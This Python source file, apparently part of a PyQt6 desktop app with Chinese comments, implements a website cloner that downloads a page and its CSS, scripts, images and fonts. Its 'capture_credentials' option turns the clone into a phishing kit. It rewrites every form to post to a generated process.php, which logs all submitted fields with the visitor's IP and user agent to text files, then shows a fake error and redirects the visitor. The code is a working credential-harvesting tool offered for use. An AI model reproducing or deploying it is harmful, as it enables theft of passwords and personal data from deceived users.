import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, unquote
from PyQt6.QtCore import QObject, pyqtSignal
import threading
import chardet
import html
import re
from playwright.sync_api import sync_playwright
import time
import mimetypes
import hashlib

class WebDownloader(QObject):
    progress_updated = pyqtSignal(int)
    status_updated = pyqtSignal(str)
    download_finished = pyqtSignal()
    
    def __init__(self):
        super().__init__()
        self._cancel = False
        self._total_resources = 0
        self._downloaded_resources = 0
        self._browser = None
        self._page = None
        self._downloaded_urls = set()  # 用于跟踪已下载的URL
        
        # 确保 mimetypes 数据库包含常见的 web 文件类型
        mimetypes.add_type('text/css', '.css')
        mimetypes.add_type('application/javascript', '.js')
        mimetypes.add_type('image/webp', '.webp')
        mimetypes.add_type('image/svg+xml', '.svg')
        mimetypes.add_type('font/woff2', '.woff2')
        mimetypes.add_type('font/woff', '.woff')
        mimetypes.add_type('font/ttf', '.ttf')
    
    def cancel(self):
        self._cancel = True
        if self._browser:
            self._browser.close()
    
    def _update_progress(self):
        if self._total_resources == 0:
            progress = 0
        else:
            progress = int((self._downloaded_resources / self._total_resources) * 100)
        self.progress_updated.emit(progress)

    def _decode_html_entities(self, text):
        """解码HTML实体"""
        # 先处理数字实体
        text = re.sub(r'&#(\d+);', lambda m: chr(int(m.group(1))), text)
        # 再处理命名实体
        return html.unescape(text)
    
    def _get_file_extension(self, url, content_type=None):
        """根据URL和内容类型获取文件扩展名"""
        # 首先尝试从URL获取扩展名
        ext = os.path.splitext(urlparse(url).path)[1].lower()
        if ext:
            return ext
            
        # 如果URL中没有扩展名，使用content-type
        if content_type:
            ext = mimetypes.guess_extension(content_type.split(';')[0].strip())
            if ext:
                return ext
                
        # 如果还是没有找到扩展名，根据URL特征判断
        if 'css' in url:
            return '.css'
        elif 'js' in url:
            return '.js'
        return '.bin'  # 默认扩展名
    
    def _get_safe_filename(self, url, content_type=None):
        """生成安全的文件名"""
        # 获取原始文件名
        filename = os.path.basename(unquote(urlparse(url).path))
        if not filename:
            # 如果URL没有文件名，使用URL的MD5作为文件名
            url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
            ext = self._get_file_extension(url, content_type)
            filename = f"{url_hash}{ext}"
        return filename
    
    def _download_resource(self, url, save_path, headers):
        """下载单个资源文件"""
        if url in self._downloaded_urls:
            return None
            
        try:
            response = requests.get(url, headers=headers, timeout=10)
            if response.status_code != 200:
                return None
                
            content_type = response.headers.get('content-type', '')
            filename = self._get_safe_filename(url, content_type)
            file_path = os.path.join(save_path, filename)
            
            # 保存文件
            with open(file_path, "wb") as f:
                f.write(response.content)
                
            self._downloaded_urls.add(url)
            return filename
        except Exception as e:
            self.status_updated.emit(f"警告: 下载 {url} 失败: {str(e)}")
            return None
    
    def _generate_php_backend(self, save_path, html_content, redirect_url):
        """生成PHP后端代码"""
        # 创建data目录用于存储捕获的数据
        data_dir = os.path.join(save_path, 'data')
        os.makedirs(data_dir, exist_ok=True)
        
        # 修改HTML内容，添加表单处理
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # 查找所有表单
        forms = soup.find_all('form')
        for form in forms:
            # 修改表单action为本地PHP处理脚本
            form['action'] = 'process.php'
            form['method'] = 'post'
        
        # 生成process.php
        php_code = """<?php
// 获取POST数据
$data = $_POST;
$time = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];

// 准备保存的内容
$content = "时间: $time\\n";
$content .= "IP: $ip\\n";
$content .= "UA: $ua\\n";
$content .= "数据:\\n";
foreach($data as $key => $value) {
    $content .= "$key: $value\\n";
}
$content .= "------------------------\\n";

// 保存到文件
$file = 'data/' . date('Y-m-d_H-i-s') . '.txt';
if(file_put_contents($file, $content, FILE_APPEND)) {
    // 显示错误提示并跳转
    echo '<script>alert("系统发生错误，请重试！"); window.location.href = "%s";</script>';
} else {
    die('数据保存失败');
}
?>""" % redirect_url
        
        # 保存PHP文件
        with open(os.path.join(save_path, 'process.php'), 'w', encoding='utf-8') as f:
            f.write(php_code)
            
        return str(soup)
    
    def download_website(self, url, output_folder, wait_for_load=False, capture_credentials=False, redirect_url=""):
        self._cancel = False
        self._total_resources = 0
        self._downloaded_resources = 0
        self._downloaded_urls.clear()
        
        # 在新线程中运行下载任务
        thread = threading.Thread(target=self._download_thread, 
                                args=(url, output_folder, wait_for_load, capture_credentials, redirect_url))
        thread.start()
    
    def _get_dynamic_page_content(self, url):
        """使用Playwright获取动态加载的页面内容"""
        try:
            with sync_playwright() as p:
                if self._cancel:
                    return None
                    
                self.status_updated.emit("启动浏览器...")
                browser = p.chromium.launch()
                self._browser = browser
                page = browser.new_page()
                self._page = page
                
                self.status_updated.emit("正在加载页面...")
                page.goto(url, wait_until="networkidle")
                
                # 等待一段时间确保动态内容加载完成
                time.sleep(2)
                
                # 获取完整的HTML内容
                content = page.content()
                
                browser.close()
                self._browser = None
                self._page = None
                
                return content
        except Exception as e:
            self.status_updated.emit(f"动态加载出错: {str(e)}")
            return None
    
    def _process_css_urls(self, css_content, base_url, save_path, headers):
        """处理CSS文件中的URL引用"""
        def replace_url(match):
            url = match.group(1).strip('"\'')
            if url.startswith(('data:', 'http:', 'https:', '//')):
                if url.startswith('//'):
                    url = 'https:' + url
                if url.startswith(('http:', 'https:')):
                    filename = self._download_resource(url, save_path, headers)
                    if filename:
                        return f'url("{filename}")'
                return f'url("{url}")'
            else:
                full_url = urljoin(base_url, url)
                filename = self._download_resource(full_url, save_path, headers)
                if filename:
                    return f'url("{filename}")'
                return match.group(0)
        
        # 匹配CSS中的url()
        url_pattern = r'url\([\'"]?([^\'"()]+)[\'"]?\)'
        return re.sub(url_pattern, replace_url, css_content)
    
    def _get_unique_folder_name(self, base_path, url):
        """生成唯一的文件夹名称：时间+域名（不含端口号）"""
        # 从 URL 中提取域名，去掉端口号
        parsed_url = urlparse(url)
        domain = parsed_url.netloc.split(':')[0]  # 只取冒号前面的部分，去掉端口号
        domain = domain.replace(".", "_")
        
        # 生成时间戳
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        
        # 组合文件夹名称：时间+域名
        folder_name = f"{timestamp}_{domain}"
        
        # 确保文件夹名称合法（去除特殊字符）
        folder_name = re.sub(r'[<>:"/\\|?*]', '', folder_name)  # 移除 Windows 不允许的字符
        
        # 确保文件夹名称唯一
        counter = 1
        original_name = folder_name
        while os.path.exists(os.path.join(base_path, folder_name)):
            folder_name = f"{original_name}_{counter}"
            counter += 1
        
        return folder_name
    
    def _download_thread(self, url, output_folder, wait_for_load, capture_credentials, redirect_url):
        try:
            # 使用新的文件夹命名方式
            save_path = os.path.join(output_folder, self._get_unique_folder_name(output_folder, url))
            
            # 创建资源目录
            os.makedirs(save_path, exist_ok=True)
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            
            # 根据选项决定使用哪种方式获取页面内容
            if wait_for_load:
                html_content = self._get_dynamic_page_content(url)
                if html_content is None:
                    return
            else:
                # 下载主页
                self.status_updated.emit("正在下载主页...")
                response = requests.get(url, headers=headers)
                if response.status_code != 200:
                    self.status_updated.emit(f"错误: 无法访问网站 (状态码: {response.status_code})")
                    return
                
                # 检测网页编码
                content = response.content
                detected = chardet.detect(content)
                encoding = detected['encoding'] if detected['encoding'] else 'utf-8'
                
                # 使用检测到的编码解码内容
                try:
                    html_content = content.decode(encoding)
                except UnicodeDecodeError:
                    try:
                        html_content = content.decode('utf-8', errors='ignore')
                    except:
                        html_content = content.decode('gbk', errors='ignore')
            
            # 解码URL编码的中文字符
            html_content = unquote(html_content)
            
            # 解码HTML实体
            html_content = self._decode_html_entities(html_content)
            
            # 如果需要捕获凭据，生成PHP后端
            if capture_credentials:
                self.status_updated.emit("正在生成PHP后端...")
                html_content = self._generate_php_backend(save_path, html_content, redirect_url)
                
            soup = BeautifulSoup(html_content, "html.parser")
            
            # 设置正确的编码声明
            if soup.find('meta', charset=True):
                soup.find('meta', charset=True)['charset'] = 'utf-8'
            else:
                meta_tag = soup.new_tag('meta')
                meta_tag['charset'] = 'utf-8'
                if soup.head:
                    soup.head.insert(0, meta_tag)
                else:
                    head_tag = soup.new_tag('head')
                    head_tag.append(meta_tag)
                    if soup.html:
                        soup.html.insert(0, head_tag)
                    else:
                        html_tag = soup.new_tag('html')
                        html_tag.append(head_tag)
                        soup.append(html_tag)
            
            # 收集所有需要下载的资源
            resources = []
            
            # 处理CSS文件
            for tag in soup.find_all("link", rel="stylesheet"):
                if tag.get("href"):
                    resources.append((tag, "href", "css"))
            
            # 处理JavaScript文件
            for tag in soup.find_all("script", src=True):
                resources.append((tag, "src", "js"))
            
            # 处理图片文件
            for tag in soup.find_all("img", src=True):
                resources.append((tag, "src", "img"))
            
            # 处理favicon
            favicon = soup.find("link", rel="icon") or soup.find("link", rel="shortcut icon")
            if favicon and favicon.get("href"):
                resources.append((favicon, "href", "icon"))
            
            # 处理其他资源（字体等）
            for tag in soup.find_all("link"):
                if tag.get("href") and tag.get("rel")[0] not in ["stylesheet", "icon", "shortcut icon"]:
                    resources.append((tag, "href", "other"))
            
            self._total_resources = len(resources) + 1  # +1 for the main page
            self._downloaded_resources = 1
            self._update_progress()
            
            # 下载所有资源
            for tag, attr, res_type in resources:
                if self._cancel:
                    self.status_updated.emit("下载已取消")
                    return
                    
                resource_url = urljoin(url, tag[attr])
                self.status_updated.emit(f"正在下载: {resource_url}")
                
                filename = self._download_resource(resource_url, save_path, headers)
                if filename:
                    tag[attr] = filename
                    
                    # 如果是CSS文件，需要处理其中的资源引用
                    if res_type == "css":
                        try:
                            css_path = os.path.join(save_path, filename)
                            with open(css_path, 'r', encoding='utf-8') as f:
                                css_content = f.read()
                            processed_css = self._process_css_urls(css_content, resource_url, save_path, headers)
                            with open(css_path, 'w', encoding='utf-8') as f:
                                f.write(processed_css)
                        except Exception as e:
                            self.status_updated.emit(f"警告: 处理CSS文件 {filename} 失败: {str(e)}")
                
                self._downloaded_resources += 1
                self._update_progress()
            
            # 保存HTML文件
            html_filename = "index.php" if capture_credentials else "index.html"
            with open(os.path.join(save_path, html_filename), "w", encoding="utf-8", errors='ignore') as f:
                f.write(str(soup))
            
            if not self._cancel:
                self.status_updated.emit("克隆完成!")
                self.download_finished.emit()
                
        except Exception as e:
            self.status_updated.emit(f"错误: {str(e)}") 